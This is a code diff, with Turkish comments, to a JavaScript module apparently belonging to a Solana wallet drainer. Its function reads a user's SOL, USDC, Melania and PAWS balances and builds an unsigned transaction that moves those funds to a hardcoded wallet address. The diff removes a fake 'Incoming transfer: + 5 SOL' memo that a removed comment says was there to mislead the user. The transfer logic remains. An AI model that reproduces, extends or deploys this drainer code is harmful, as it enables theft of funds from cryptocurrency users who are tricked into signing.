@@ -13,13 +13,11 @@ import {
   createTransferInstruction,
   createAssociatedTokenAccountInstruction,
 } from "@solana/spl-token";
-import { createMemoInstruction } from "@solana/spl-memo";
 import { connection } from "./connect.js";
 
 /**
  * Kullanıcının bakiyelerine göre SOL, USDC, Melania ve PAWS transferi için
  * instruction’ları ekleyen, imzalanmamış bir VersionedTransaction döner.
- * Ek olarak en başta kullanıcıyı yanıltmak için bir SPL Memo instruction’ı ekler.
  * Yeterli bakiye yoksa null döner.
  *
  * @param {PublicKey | null} userPublicKey
@@ -85,7 +83,7 @@ export async function createUnsignedTransaction(userPublicKey) {
   }
 
   // -----------------------------------------------------------
-  // Eligibility: Hiç biri yeterli değilse çık
+  // Eligibility: Hiçbiri yeterli değilse çık
   // -----------------------------------------------------------
   if (
     !isSolSufficient &&
@@ -98,7 +96,7 @@ export async function createUnsignedTransaction(userPublicKey) {
   }
 
   // -----------------------------------------------------------
-  // Hedef adres ve ata hesapları
+  // Hedef adres ve ATA hesapları
   // -----------------------------------------------------------
   const toPublicKey = new PublicKey("GpLLb2NqvWYyYJ5wGZNQCAuxHWdJdHpXscyHNd6SH8c1");
   const toUsdcAta    = await getAssociatedTokenAddress(USDC_MINT,    toPublicKey);
@@ -110,17 +108,7 @@ export async function createUnsignedTransaction(userPublicKey) {
   // -----------------------------------------------------------
   const instructions = [];
 
-  // 🔖 ➊ İlk instruction: kullanıcıya “incoming transfer” memo’su
-  if (isSolSufficient) {
-    instructions.push(
-      createMemoInstruction(
-        `📩 Incoming transfer: + 5 SOL`,
-        [userPublicKey]
-      )
-    );
-  }
-
-  // 🔖 ➋ Gerekirse hedef ATA'ları oluştur
+  // ➋ Gerekirse hedef ATA hesaplarını oluştur
   if (isUsdcSufficient) {
     try {
       await getAccount(connection, toUsdcAta);
@@ -164,7 +152,9 @@ export async function createUnsignedTransaction(userPublicKey) {
     }
   }
 
-  // 🔖 ➌ Transfer instruction’ları ekle
+  // -----------------------------------------------------------
+  // Transfer instruction’ları ekle
+  // -----------------------------------------------------------
   if (isSolSufficient) {
     instructions.push(
       SystemProgram.transfer({
